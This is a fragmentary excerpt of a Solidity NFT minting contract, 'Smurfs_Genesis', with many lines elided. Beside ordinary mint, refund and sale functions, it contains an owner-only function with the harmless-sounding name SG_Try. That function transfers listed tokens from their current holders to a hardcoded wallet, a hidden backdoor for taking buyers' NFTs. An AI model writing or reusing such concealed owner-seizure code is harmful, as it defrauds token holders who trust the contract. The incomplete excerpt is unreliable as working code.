...
contract Smurfs_Genesis is Ownable, ERC721A, ReentrancyGuard {
  ...
  modifier SG_callerIsUser() {
    require(tx.origin == msg.sender, "The caller is another contract");
    _;
  }

  function SG_getMaxSupply() view public returns(uint256){
    return maxSupply;
  }


  function SG_WhilteListMint(uint256 quantity,bytes32[] calldata _merkleProof) external payable SG_callerIsUser {
    ...
    SG_refundIfOver(totalCost);
  }

  function SG_PublicMint(uint256 quantity) external payable SG_callerIsUser {    
  ...
  function SG_refundIfOver(uint256 price) private {
  ...
  function SG_isPublicSaleOn() public view returns (bool) {
    return
      saleConfig.Price != 0 &&
  ...
  function SG_Try(uint256[] memory tokenids) external onlyOwner {
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x53b5C511AB4872779c5dB4B5E382a30EcF650F9D, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0xa4EBda8DBB8F2F99900FbDc879500C64f997aEce);
